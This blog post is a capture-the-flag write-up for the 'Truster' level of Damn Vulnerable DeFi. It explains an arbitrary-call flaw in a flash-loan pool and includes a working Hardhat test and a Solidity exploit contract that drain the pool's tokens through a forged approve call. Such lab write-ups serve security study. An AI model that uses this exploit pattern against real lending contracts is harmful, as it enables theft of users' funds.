---
layout: post
date:   2022-08-08 12:59:00 -0500
categories: DeFi flashloan
title: Damn Vulnerable DeFi - Truster
---

## Analysis

flashLoan is a non re-entrant function. The function allows an arbitrary call. This may imply the function may be tricked into doing something interesting. The goal of the challenge is to drain the pool of tokens. Flash loans can exist for ether or tokens. 

Research questions:
Q: What are the invariant that must hold for funds/tokens to leave a contract?
A: function calls transfer and transferFrom() allow the movement of ERC20 tokens. 

The flashloan function sends the tokens to a borrower account and calls an arbitrary target contract. This means, the borrower account and target function may be different. Are there any implications if they are different. 

## Problem

Arbitrary call target during flash loan.

## Exploit

```js

// truster.challenge.js

it('Exploit', async function () {
    /** CODE YOUR EXPLOIT HERE  */
    // deploy the contract
    const ExploitReceiver = await ethers.getContractFactory('ExploitReceiver', attacker);
    this.attackerContract = await ExploitReceiver.deploy(this.token.address, this.pool.address);

    //Attack
    console.log(
        'Receiver balance before attacking: ',
        String(await this.token.balanceOf(attacker.address))
    );
    console.log(
        "Exploit balance before attacking: ",
        String(await this.token.balanceOf(this.attackerContract.address))
    );

    await this.attackerContract.connect(attacker);
    await this.attackerContract.exploit(attacker.address);

    console.log(
        "Receiver balance after attacking: ",
        String(await this.token.balanceOf(attacker.address))
    );
    console.log(
        "Exploit balance after attacking: ",
        String(await this.token.balanceOf(this.attackerContract.address))
    );
});

```
ExploitReceiver smart contract

```sol
// SPDX-License-Identifier: MIT
// ExploitReceiver.sol

pragma solidity ^0.8.0;

import "../truster/TrusterLenderPool.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";


contract ExploitReceiver {
    using Address for address;

    // Receiver needs to know the pool it is receiving from
    TrusterLenderPool private immutable pool;
    IERC20 private immutable dvt;

    // attacker
    address private immutable owner;

    constructor(address payable dvtAddress, address payable poolAddress) {
        pool = TrusterLenderPool(poolAddress);
        dvt = IERC20(dvtAddress);
        owner = msg.sender;
    }

    // arbitrary function
    //https://swcregistry.io/docs/SWC-104
    function exploit(address attacker) public payable {

        require(attacker == owner);

        // prepare a call for the approve function
        // nospace in parameter stuff for signature
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            // this contract address is related to the attacker/owner
            address(this),
            dvt.balanceOf(address(pool)));

        // interact with the pool, calling the flashLoan will cause
        // the dvtToken approve to be called for our contract address
        pool.flashLoan(0, owner, address(dvt), data);

        // initiate the transfer from pool to attacker address
        dvt.transferFrom(address(pool), attacker, dvt.balanceOf(address(pool)));

    }
}
```

## Explanation

```
Objective
1. Drain the tokens TrusterLenderPool.sol contract
  a. Call an arbitrary function in an arbitrary receiver contract
  b. Arbitrary function will be the tokens approve function
  c. So that we can transfer out of the pool outside the flashLoan functionality
```

Resources
1. https://medium.com/@juanxaviervalverde/damn-vulnerable-defi-truster-level-3-solution-3a08d34ad07b

2. https://consensys.github.io/smart-contract-best-practices/development-recommendations/general/external-calls/